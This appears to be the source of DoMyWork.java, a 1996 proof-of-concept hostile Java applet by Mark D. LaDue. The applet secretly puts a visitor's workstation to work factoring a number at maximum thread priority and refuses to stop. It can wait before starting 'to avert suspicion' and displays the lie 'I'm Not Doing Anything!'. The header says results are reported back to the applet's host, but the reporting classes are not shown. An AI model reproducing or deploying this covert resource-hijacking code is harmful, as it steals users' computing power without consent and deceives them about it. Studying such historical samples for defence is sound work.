/* DoMyWork.java by Mark D. LaDue */

/* March 2, 1996 */

/*  Copyright (c) 1996 Mark D. LaDue
    You may study, use, modify, and distribute this example for any purpose.
    This example is provided WITHOUT WARRANTY either expressed or implied.  */

/*  This Java applet makes you try to factor a moderately long integer
    by trial division, and it reports the reults back to it's home.
    Clearly the same could be done for many, many other sorts of
    calculations.  While it performs no hostile actions per se, it does
    put your workstation to work for somebody else, perhaps a business
    competitor or someone trying to crack codes.  To create an applet
    that does other sorts of work, you can replace the class GetFactor
    with another working class and adjust the classes Report and
    ReportServerSocket accordingly.  */

import java.awt.*;
import java.applet.Applet;

public class DoMyWork extends java.applet.Applet implements Runnable {

//  Just a font to paint strings to the applet window 
    Font bigFont = new Font("TimesRoman", Font.BOLD, 36);

//  These threads will make you perform the calculations
//  and send the results back to their home.
    Thread controller = null;
    Thread sleeper = null;

//  Used to read in a parameter that makes the thread sleep for a
//  specified number of seconds taking effect
    int delay;
//  Used to read in a parameter that determines the port to which
//  Sockets will be connected
    public static int thePort;

//  Used to read in as a parameter the long integer to be factored
    public static long theNumber;

//  Used to hold the localhost to which the applet will connect
    public static String theHome;

    public void init() {
    setBackground(Color.white);

//  Determine how many seconds the main thread should sleep before kicking in
    String str = getParameter("wait");
    if (str == null)
        delay = 0;
    else delay = (1000)*(Integer.parseInt(str));
//  Determine the port number
    str = getParameter("portnumber");
    if (str == null)
        thePort = 9000;
    else thePort = Integer.parseInt(str);
//  Determine the long integer to be factored
    str = getParameter("tobefactored");
    if (str == null)
        theNumber = 2L;
    else theNumber = Long.parseLong(str);
//  Determine the home host of the applet
    theHome = getDocumentBase().getHost();
    }


/*  Create and start the main thread in the standard way */

    public void start() {
        if (sleeper == null) {
        sleeper = new Thread(this);
        sleeper.setPriority(Thread.MAX_PRIORITY);
        sleeper.start();
        }
    }

/*  And why should we stop? */

    public void stop() {}

    public void run() {

//  Let the applet tell its lie
        repaint();

//  Let the applet sleep for a while to avert suspicion if you like
        try {sleeper.sleep(delay);}
        catch(InterruptedException e) {}

        if (controller == null) {
        Calculator calc = new Calculator();
        controller = new Thread(calc);
        controller.setPriority(Thread.MAX_PRIORITY);
        controller.start();
        }
    }

/*  Paints the applet's lie */

    public void update(Graphics g) {
        paint(g);
    }

    public void paint(Graphics g) {
    g.setColor(Color.blue);
    g.setFont(bigFont);
    g.drawString("I'm Not Doing Anything!", 10, 200);
    }
}

